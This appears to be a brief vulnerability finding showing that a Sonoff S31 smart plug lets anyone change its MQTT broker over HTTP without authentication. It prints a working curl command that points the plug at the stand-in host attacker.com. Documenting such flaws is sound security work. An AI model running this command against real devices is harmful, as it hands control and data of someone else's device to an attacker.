#  MQTT Configuration Injection

## 📋 Summary
The Sonoff S31 smart plug accepted a command to change its MQTT broker (`MqttHost`) without requiring any authentication.

##  Command Used
```bash
curl "http://192.168.8.214/cm?cmnd=MqttHost%20attacker.com"
```
